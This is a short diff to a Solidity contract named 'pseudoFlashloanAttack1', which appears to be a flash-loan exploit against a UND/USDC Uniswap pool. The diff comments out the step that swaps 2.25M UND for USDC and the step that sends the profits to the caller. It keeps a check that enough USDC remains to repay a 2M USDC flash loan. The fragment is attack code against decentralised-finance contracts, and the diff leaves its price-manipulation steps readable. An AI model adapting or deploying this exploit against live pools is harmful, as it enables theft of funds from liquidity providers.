@@ -107,21 +107,28 @@ contract pseudoFlashloanAttack1 {
         _path2[0] = undAddr;
         _path2[1] = usdcAddr;
         
-        uniswapRouter.swapExactTokensForTokens(
-            UndBalance, // supposed to be 2.25M UND
-            2200 * (10 ** 6), // minimum amt. Change this if something not working
-            _path2,
-            address(this),  // receiver (this address)
-            block.timestamp + 120  // 2 min wait time
-        );
+        // // step 4: Attacker buys 2.25M USDC from UND/USDC pool
+        // uint UndBalance = und.balanceOf(address(this));
+        // und.approve(router, UndBalance);
+        // address[] memory _path2 = new address[](2);
+        // _path2[0] = undAddr;
+        // _path2[1] = usdcAddr;
+        // require(UndBalance >= 1250000 * (10 ** 18), "Not minting enough");
+        // uniswapRouter.swapExactTokensForTokens(
+        //     UndBalance, // supposed to be 2.25M UND
+        //     2200 * (10 ** 6), // minimum amt. Change this if something not working
+        //     _path2,
+        //     address(this),  // receiver (this address)
+        //     block.timestamp + 120  // 2 min wait time
+        // );
         
         
         // step 5: Pay back 2M USDC loan (+ fees)
         // require(usdc.transfer(loanReceiver, 2000000 * (10 ** 6)), "Insufficient USDC? FlashLoan failed");
         require(usdc.balanceOf(address(this)) >= 2000000 * (10 ** 6), "Not enough USDC. Flash Loan failed");
         
-        // step 6: Send any profits to msg.sender
-        uint USDCbal = usdc.balanceOf(address(this));
-        usdc.transfer(msg.sender, USDCbal);
+        // // step 6: Send any profits to msg.sender
+        // uint USDCbal = usdc.balanceOf(address(this));
+        // usdc.transfer(msg.sender, USDCbal);
     }
 }
